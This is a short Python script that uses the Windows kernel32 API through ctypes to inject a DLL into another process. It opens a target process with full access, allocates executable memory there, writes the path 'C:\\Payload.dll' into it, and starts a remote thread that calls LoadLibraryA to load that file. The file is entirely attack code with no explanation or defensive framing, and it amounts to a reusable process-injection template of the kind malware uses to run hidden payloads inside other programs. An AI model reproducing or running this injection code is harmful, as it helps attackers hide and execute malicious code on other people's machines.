import os
from ctypes import *

# Load kernel32 library and get the function addresses
kernel32 = windll.kernel32

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [c_ulong, c_bool, c_int]
OpenProcess.restype = c_void_p

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [c_void_p, c_void_p, c_char_p, c_size_t, POINTER(c_size_t)]
WriteProcessMemory.restype = c_bool

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [c_void_p, c_void_p, c_size_t, c_ulong, c_ulong]
VirtualAllocEx.restype = c_void_p

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [c_void_p, c_void_p, c_ulong, c_void_p, c_void_p, c_ulong, POINTER(c_int)]
CreateRemoteThread.restype = c_void_p

# Define necessary constants
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

kernel32.GetModuleHandleA.argtypes = [c_char_p]
kernel32.GetModuleHandleA.restype = c_void_p

kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
kernel32.GetProcAddress.restype = c_void_p

# Get the function addresses
LoadLibraryA = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")

# Create a buffer with the path of the payload DLL
dll_path = b"C:\\Payload.dll"
dll_path_buffer = create_string_buffer(dll_path)

# Allocate memory in the target process and write the path to it
process_h = OpenProcess(PROCESS_ALL_ACCESS, False, 1)
alloc_mem = VirtualAllocEx(process_h, None, len(dll_path) + 1, 0x3000, 0x40)
WriteProcessMemory(process_h, alloc_mem, dll_path_buffer, len(dll_path), None)

# Create a remote thread to load the DLL
thread_id = c_int()
CreateRemoteThread(process_h, None, 0, LoadLibraryA, alloc_mem, 0, byref(thread_id))
